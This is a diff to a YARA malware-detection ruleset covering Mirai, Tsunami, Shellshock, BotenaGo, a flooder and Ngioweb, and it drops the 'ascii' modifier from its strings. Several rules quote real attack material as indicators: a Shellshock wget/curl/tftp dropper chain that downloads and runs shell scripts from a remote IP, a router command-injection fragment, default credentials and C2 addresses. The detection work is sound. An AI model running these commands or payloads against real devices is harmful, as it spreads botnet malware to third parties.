@@ -40,10 +40,10 @@ rule Mirai_Generic_C {
     description = "Strings from dumped mem"
     hash = "a9878bffe5e771bd09109df185dc41883ca0a560bb7b635abddc4259995ec37"
   strings:
-    $cc = "194.76.226.240" ascii
-    $s1 = "Device Connected: %s | Port: %s | Arch: %s" ascii
-    $s2 = "TSource Engine Query" ascii
-    $s3 = "L33T HaxErS" ascii
+    $cc = "194.76.226.240"
+    $s1 = "Device Connected: %s | Port: %s | Arch: %s"
+    $s2 = "TSource Engine Query"
+    $s3 = "L33T HaxErS"
   condition:
     $cc or ($s2 and ($s1 or $s3))
 }
@@ -73,8 +73,8 @@ rule Mirai_Tsunami_A
     // Fixme false positive of idea-IU and powershell
     // Update: Merge memory scan
   strings:
-    $ = "WHO %s" ascii
-    $ = "PONG %s" ascii
+    $ = "WHO %s"
+    $ = "PONG %s"
   condition:
     (
       is_elf and
@@ -131,11 +131,11 @@ rule Shellshock_Generic_A {
     date = "12/11/2021"
     target = "File, memory"
   strings:
-    $addr_1 = "http://195.58.39.37/bins.sh" ascii
-    $addr_2 = "185.172.110.209" ascii
+    $addr_1 = "http://195.58.39.37/bins.sh"
+    $addr_2 = "185.172.110.209"
     // $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
     // $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
-    $cmd_3 = "chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh" ascii
+    $cmd_3 = "chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh"
   condition:
     any of them
 }
@@ -150,11 +150,11 @@ rule BotenaGo_Generic_A {
     reference = "https://otx.alienvault.com/indicator/file/0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"
     reference = "https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits"
   strings:
-    $addr_1 = "107.172.30.215" ascii
-    $addr_2 = "159.65.232.56" ascii
-    $addr_3 = "http://adminisp:adminispbad" ascii nocase
-    $cc_1 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://" ascii
-    $cmd_1 = "/bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei" ascii
+    $addr_1 = "107.172.30.215"
+    $addr_2 = "159.65.232.56"
+    $addr_3 = "http://adminisp:adminispbad" nocase
+    $cc_1 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
+    $cmd_1 = "/bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
   condition:
     any of them
 }
@@ -168,8 +168,8 @@ rule Flooder_Generic_A {
     target = "File, Memory"
     hash = "123e6d1138bfd58de1173818d82b504ef928d5a3be7756dd627c594de4aad096"
   strings:
-    $1 = "Opening sockets" ascii
-    $2 = "Sending attack" ascii
+    $1 = "Opening sockets"
+    $2 = "Sending attack"
   condition:
     all of them
 }
@@ -185,8 +185,8 @@ rule Ngioweb_Generic_A {
     hash = "0b213e1f92a2613f7cebff82e8ffbdae985e3446960bf4bd365b5751efa08b53" // Packed UPX binary
     description = "String detection for Ngioweb memory scan. Static file was detected by section hash"
   strings:
-    $1 = "D$8L;|" ascii
-    $2 = "$D37D1" ascii
+    $1 = "D$8L;|"
+    $2 = "$D37D1"
   condition:
     all of them
 }
